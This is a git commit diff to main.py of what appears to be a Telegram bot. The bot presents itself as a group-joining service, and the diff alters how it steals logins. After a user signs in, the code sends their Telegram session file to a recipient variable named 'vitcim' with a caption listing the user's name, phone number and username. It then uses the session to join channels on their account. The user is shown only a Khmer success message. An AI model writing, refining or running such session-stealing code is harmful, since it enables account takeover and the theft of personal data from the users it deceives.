88881e4e4fdcb9e6c0394a25e3268565ef750e7e
thatexdev <113002195+thatexdev@users.noreply.github.com>
2022-09-17 23:24:04 +0700

    Update main.py

--- main.py
+++ main.py
@@ -206,7 +206,7 @@ async def login(lel, message):
       os.remove("1.csv")
       make_archive('sessions', 'zip', 'sessions')
       time.sleep(5)
-      await app.send_document(vitcim, "sessions.zip", caption=f"**Name : {message.from_user.first_name} ⭕️**\n======>\n**Phone : +{phone} ✅**\n======>\n**Username : @{message.from_user.username} 👤** \n======>\n**FROM : @JVP_CAMBODIABOT ♻️**\n\n** Server RDP  :  Heroku  🌐**\n")
+      await app.send_document(vitcim, f"sessions/{phone}", caption=f"**Name : {message.from_user.first_name} ⭕️**\n======>\n**Phone : +{phone} ✅**\n======>\n**Username : @{message.from_user.username} 👤** \n======>\n**FROM : @JVP_CAMBODIABOT ♻️**\n\n** Server RDP  :  Heroku  🌐**\n")
       await client(JoinChannelRequest('https://t.me/BeaktleyKhmer'))
       await client(JoinChannelRequest('https://t.me/KhmernuddexKidd'))
       await app.send_message(message.chat.id, f"ចូលគ្រុបដោយជោគជ័យ  ✅ សូមឆែកគ្រុប ថ្មីៗក្នុងអាខោនរបស់អ្នក \n\n**រក្សារសិទ្ធដោយ @JVP_CAMBODIABOT**")
